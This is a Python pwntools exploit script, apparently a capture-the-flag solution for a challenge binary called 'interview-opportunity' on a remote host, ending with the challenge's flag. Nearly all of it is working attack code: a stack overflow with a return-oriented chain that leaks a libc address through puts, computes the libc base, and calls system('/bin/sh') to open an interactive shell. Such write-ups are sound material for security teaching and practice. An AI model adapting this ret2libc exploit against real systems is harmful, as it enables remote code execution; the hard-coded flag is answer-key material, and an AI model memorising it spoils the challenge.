#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mc.ax --port 31081 interview-opportunity
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('interview-opportunity')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mc.ax'
port = int(args.PORT or 31081)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main+101
b *0x00401281
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

import time

io = start(env={"LD_PRELOAD":"./libc.so.6 "})

pop_rdi_ret = 0x401313
ret = 0x40101a
start = 0x4010a0

pl = b'A'*34
pl += p64(pop_rdi_ret)
pl += p64(exe.got['puts'])
pl += p64(exe.plt['puts'])
pl += p64(start)

io.sendline(pl)
io.recvuntil('Hello: \n')
io.recvline()
leak = int.from_bytes(io.recvline().rstrip(), 'little')

print(f'[+] libc leak: {hex(leak)}')
base = leak - 0x0765f0
print(f'[+] libc base: {hex(base)}')

system = base + 0x048e50
binsh = base + 0x18a152

pl2 = b'B'*18
pl2 += p64(ret)
pl2 += p64(ret)
pl2 += p64(ret)
pl2 += p64(pop_rdi_ret)
pl2 += p64(binsh)
pl2 += p64(system)

io.sendline(pl2)

io.interactive()
#dice{0ur_f16h7_70_b347_p3rf3c7_blu3_5h4ll_c0n71nu3}
